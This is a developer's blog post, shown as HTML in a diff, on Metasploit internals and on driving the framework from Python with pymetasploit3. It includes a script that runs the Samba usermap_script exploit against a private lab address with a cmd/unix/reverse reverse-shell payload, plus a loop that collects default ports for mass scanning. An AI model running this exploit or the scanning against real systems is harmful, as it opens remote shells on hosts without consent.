@@ -1,0 +1,334 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Metasploit Scripting And More | Blog of James Brown</title>
+  <meta name="author" content="James Brown">
+  
+  <meta name="description" content="This article explains the process of loading resource scripts in Metasploit using Ruby libraries and `Rex::Script::Shell`. It also covers the usage of the Metasploit gem for vulnerability scanning through Python&#39;s pymetasploit3 package. The script interacts with the Metasploit Framework, setting up a background RPC service and loading modules.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Metasploit Scripting And More"/>
+  <meta property="og:site_name" content="Blog of James Brown"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/blog/atom.xml" title="Blog of James Brown" type="application/atom+xml">
+  
+  
+    <link href="/blog/favicon.png" rel="icon">
+  
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/blog/css/themes/cerulean.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/highlight-default.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/blog/css/comment.css" media="screen" type="text/css">
+  <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.7/es5-sham.min.js"></script>
+  <![endif]-->
+
+  <script src="/blog/js/jquery-2.0.3.min.js"></script>
+  
+  
+  <!-- analytics -->
+  
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+  <nav id="main-nav" class="navbar navbar-inverse navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+	<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+       <a class="navbar-brand" href="/blog/">Blog of James Brown</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/blog/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/blog/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+    <div class="content">
+      
+
+
+	
+		<div class="page-header page-header-inverse ">		
+			<h1 class="title title-inverse "> Metasploit Scripting And More</h1>
+		</div>		
+	
+
+
+
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> <p>This article explains the process of loading resource scripts in Metasploit using Ruby libraries and <code>Rex::Script::Shell</code>. It also covers the usage of the Metasploit gem for vulnerability scanning through Python’s pymetasploit3 package. The script interacts with the Metasploit Framework, setting up a background RPC service and loading modules.</p>
+			
+		 </div> <!-- alert -->
+	  		
+
+	  <p>you typically need to do this before importing useful metasploit ruby libraries:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LOAD_PATH</span>.push(<span class="string">&#x27;./lib&#x27;</span>)</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rex&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msfenv&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the way metasploit loads resource script:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/msf/base/sessions/command_shell.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_file</span>(<span class="params">full_path, args</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="title class_">File</span>.extname(full_path) == <span class="string">&#x27;.rb&#x27;</span></span><br><span class="line"><span class="title class_">Rex::Script::Shell</span>.new(<span class="variable language_">self</span>, full_path).run(args)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">load_resource(full_path) <span class="comment"># usually *.rc files</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the <code>Shell.new</code>:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lib/rex/shell/base.rb</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">args=[]</span>)</span><br><span class="line"><span class="variable language_">self</span>.args = args = args.flatten</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(<span class="symbol">:</span><span class="symbol">:File</span>.read(<span class="variable language_">self</span>.path, <span class="symbol">:</span><span class="symbol">:File</span>.size(<span class="variable language_">self</span>.path)), binding )</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Rex</span><span class="symbol">:</span><span class="symbol">:Script</span><span class="symbol">:</span><span class="symbol">:Completed</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line"><span class="variable language_">self</span>.error = e</span><br><span class="line"><span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>the  <code>load_resource</code>:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: lib/rex/ui/text/resource.rb</span></span><br><span class="line"><span class="comment"># -*- coding: binary -*-</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Rex</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Ui</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Text</span></span><br><span class="line"><span class="keyword">module</span> <span class="title class_">Resource</span></span><br><span class="line"><span class="comment"># Processes a resource script file for the console.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> path [String] Path to a resource file to run</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> [void]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_resource</span>(<span class="params">path</span>)</span><br><span class="line"><span class="keyword">if</span> path == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">resource_file = <span class="variable">$stdin</span>.read</span><br><span class="line">path = <span class="string">&#x27;stdin&#x27;</span></span><br><span class="line"><span class="keyword">elsif</span> <span class="symbol">:</span><span class="symbol">:File</span>.exist?(path)</span><br><span class="line">resource_file = <span class="symbol">:</span><span class="symbol">:File</span>.read(path)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_error(<span class="string">&quot;Cannot find resource script: <span class="subst">#&#123;path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment"># Process ERB directives first</span></span><br><span class="line">print_status <span class="string">&quot;Processing <span class="subst">#&#123;path&#125;</span> for ERB directives.&quot;</span></span><br><span class="line">erb = <span class="variable constant_">ERB</span>.new(resource_file)</span><br><span class="line">processed_resource = erb.result(binding)</span><br><span class="line">lines = processed_resource.each_line.to_a</span><br><span class="line">bindings = &#123;&#125;</span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line">line.strip!</span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line.length == <span class="number">0</span></span><br><span class="line"><span class="keyword">next</span> <span class="keyword">if</span> line =~ <span class="regexp">/^#/</span></span><br><span class="line"><span class="comment"># Pretty soon, this is going to need an XML parser :)</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> case matters for the tag and for binding names</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/&lt;ruby/</span></span><br><span class="line"><span class="keyword">if</span> line =~ <span class="regexp">/\s+binding=(?:&#x27;(\w+)&#x27;|&quot;(\w+)&quot;)(&gt;|\s+)/</span></span><br><span class="line">bin = (<span class="variable">$~</span>[<span class="number">1</span>] |<span class="params"></span>| <span class="variable">$~</span>[<span class="number">2</span>])</span><br><span class="line">bindings[bin] = binding <span class="keyword">unless</span> bindings.has_key? bin</span><br><span class="line">bin = bindings[bin]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">bin = binding</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">buff = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> lines.length &gt; <span class="number">0</span></span><br><span class="line">line = lines.shift</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> <span class="keyword">not</span> line</span><br><span class="line"><span class="keyword">break</span> <span class="keyword">if</span> line =~ <span class="regexp">/&lt;\/ruby&gt;/</span></span><br><span class="line">buff &lt;&lt; line</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> ! buff.empty?</span><br><span class="line">print_status(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Code (<span class="subst">#&#123;buff.length&#125;</span> bytes)&quot;</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">eval(buff, bin)</span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Interrupt</span></span><br><span class="line"><span class="keyword">raise</span> <span class="variable">$!</span></span><br><span class="line"><span class="keyword">rescue</span> <span class="symbol">:</span><span class="symbol">:Exception</span> =&gt; e</span><br><span class="line">print_error(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; Ruby Error: <span class="subst">#&#123;e.<span class="keyword">class</span>&#125;</span> <span class="subst">#&#123;e&#125;</span> <span class="subst">#&#123;e.backtrace&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">print_line(<span class="string">&quot;resource (<span class="subst">#&#123;path&#125;</span>)&gt; <span class="subst">#&#123;line&#125;</span>&quot;</span>)</span><br><span class="line">run_single(line)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>vulnerability scanners:</p>
+<p><a target="_blank" rel="noopener" href="https://dradis.com/ce/">https://dradis.com/ce/</a></p>
+<p>nessus</p>
+<p>nexpose</p>
+<p>openvas</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://rubygems.org/gems/metasploit-framework">metasploit-framework</a> is a ruby gem.</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.infosecmatter.com/metasploit-module-library/">https://www.infosecmatter.com/metasploit-module-library/</a></p>
+<p><a target="_blank" rel="noopener" href="https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module">https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/auxiliary-module</a></p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://github.com/hahwul/mad-metasploit">mad-metasploit</a> custom metasploit scripts</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://www.offsec.com/metasploit-unleashed/">metasploit unleashed</a></p>
+<p><a target="_blank" rel="noopener" href="https://docs.metasploit.com/">official metasploit documentation</a></p>
+<hr>
+<p>metasploit has enabled ssl by default. http will not work.</p>
+<p>install package:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pymetasploit3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>launch metasploit background rpc service:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get help</span></span><br><span class="line">msfrpcd -h</span><br><span class="line"><span class="comment"># start background service</span></span><br><span class="line">msfrpcd -P lazero</span><br><span class="line"><span class="comment"># or if you want foreground service</span></span><br><span class="line">msfrpcd -P lazero -f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>run script:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">PWD = <span class="string">&quot;lazero&quot;</span></span><br><span class="line">custom_module_path = <span class="string">&quot;custom_msf_module&quot;</span></span><br><span class="line"><span class="keyword">assert</span> os.path.exists(custom_module_path), (</span><br><span class="line"><span class="string">&quot;Custom module path not found at: &#x27;%s&#x27;&quot;</span> % custom_module_path</span><br><span class="line">)</span><br><span class="line"><span class="comment"># write custom python modules with:</span></span><br><span class="line"><span class="comment"># https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html</span></span><br><span class="line">client = MsfRpcClient(</span><br><span class="line">password=PWD, ssl=<span class="literal">True</span></span><br><span class="line">)  <span class="comment"># requires ssl by default. otherwise won&#x27;t work</span></span><br><span class="line"><span class="comment"># the module structure must be identical to the one at , otherwise it will not load.</span></span><br><span class="line">client.core.addmodulepath(os.path.abspath(custom_module_path))</span><br><span class="line">exploit_id = <span class="string">&quot;multi/samba/usermap_script&quot;</span></span><br><span class="line">exp_mod = client.modules.use(<span class="string">&quot;exploit&quot;</span>, exploit_id)</span><br><span class="line">RHOST = <span class="string">&quot;172.16.194.172&quot;</span></span><br><span class="line">LHOST = <span class="string">&quot;172.16.194.163&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;RHOST&quot;</span>] = RHOST  <span class="comment"># this host is not running.</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;PAYLOAD&quot;</span>] = <span class="string">&quot;cmd/unix/reverse&quot;</span></span><br><span class="line">exp_mod.runoptions[<span class="string">&quot;LHOST&quot;</span>] = LHOST</span><br><span class="line">msf_console = (</span><br><span class="line">client.consoles.console()</span><br><span class="line">)  <span class="comment"># you can manually read/write instead of using below method.</span></span><br><span class="line"><span class="comment"># timeout: 301 seconds.</span></span><br><span class="line">exploit_run_output = msf_console.run_module_with_output(exp_mod)  <span class="comment"># str</span></span><br><span class="line"><span class="built_in">print</span>(exploit_run_output)  <span class="comment"># now have output. but still it is not streaming.</span></span><br><span class="line"><span class="comment"># you may want to overwrite the original implementation. the data is actually produced step by step.</span></span><br><span class="line">run_output_file = <span class="string">&quot;samba_usermap_script_output.log&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(run_output_file, <span class="string">&quot;w+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(exploit_run_output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[metasploit]&quot;</span>, <span class="string">&quot;output file saved at:&quot;</span>, run_output_file)</span><br><span class="line"><span class="comment"># thank you very much.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>To do mass scanning, first we need to obtain the default RPORT for each exploit.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module_types = [<span class="string">&#x27;exploits&#x27;</span>,<span class="string">&#x27;auxiliary&#x27;</span>, <span class="string">&quot;encoders&quot;</span>, <span class="string">&quot;nops&quot;</span>, <span class="string">&quot;payloads&quot;</span>, <span class="string">&#x27;post&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> mt_plural <span class="keyword">in</span> module_types:</span><br><span class="line">module_type = mt_plural.rstrip(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> all_module_names:</span><br><span class="line">mod = client.modules.use(module_type, name)</span><br><span class="line"><span class="comment"># get default RPORT</span></span><br><span class="line">default_rport = mod.runoptions.get(<span class="string">&quot;RPORT&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+	  
+	</div>
+
+	<!-- recommended posts -->
+	
+
+	<div>
+  	<center>
+	<div class="pagination">
+<ul class="pagination">
+	 
+				
+		<li class="prev"><a href="/blog/2024/03/31/6353e9ac-d204-48d1-a699-d84d9c43717f/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>Prev</a></li>
+  		
+
+        <li><a href="/blog/archives"><i class="fa fa-archive"></i>Archive</a></li>
+
+		
+          <li class="next"><a href="/blog/2024/03/31/52864fca-3c66-404f-a23c-ca32d55a180c/" class="alignright next">Next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+        
+	
+</ul>
+</div>
+
+    </center>
+	</div>
+
+    <!-- share -->
+    
+        
+    <div class="bdsharebuttonbox">
+        <a href="#" class="bds_more" data-cmd="more"></a>
+        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+        <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+        <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+        <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+        <a href="#" class="bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+        <a href="#" class="bds_evernotecn" data-cmd="evernotecn" title="分享到印象笔记"></a>
+        <a href="#" class="bds_youdao" data-cmd="youdao" title="分享到有道云笔记"></a>
+        <a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+    </div>
+    <script>
+        window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"24"},"share":{}};
+        with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+    </script>
+
+
+        
+
+    
+	
+	<!-- comment -->
+	
+<section id="comment">
+  <h2 class="title">Comments</h2>
+  
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-31 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/blog/categories/Metasploit/">Metasploit<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/blog/tags/Python/">Python<span>25</span></a></li> <li><a href="/blog/tags/Metasploit/">Metasploit<span>2</span></a></li> <li><a href="/blog/tags/pymetasploit3/">pymetasploit3<span>2</span></a></li> <li><a href="/blog/tags/Ruby-libraries/">Ruby libraries<span>1</span></a></li> <li><a href="/blog/tags/Rex-Script-Shell/">Rex::Script::Shell<span>1</span></a></li> <li><a href="/blog/tags/vulnerability-scanning/">vulnerability scanning<span>1</span></a></li> <li><a href="/blog/tags/background-RPC-service/">background RPC service<span>1</span></a></li>
+
+    </ul>
+	</div>
+	
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+
+    </div>
+  </div>
+  <div class="container-narrow">
+    <footer> <p>
+  &copy; 2024 James Brown
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/blog/js/jquery.imagesloaded.min.js"></script>
+<script src="/blog/js/gallery.js"></script>
+<script src="/blog/js/bootstrap.min.js"></script>
+<script src="/blog/js/main.js"></script>
+<script src="/blog/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/blog/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+
+<!-- syntax highlighting -->
+
+
+</body>
+</html>
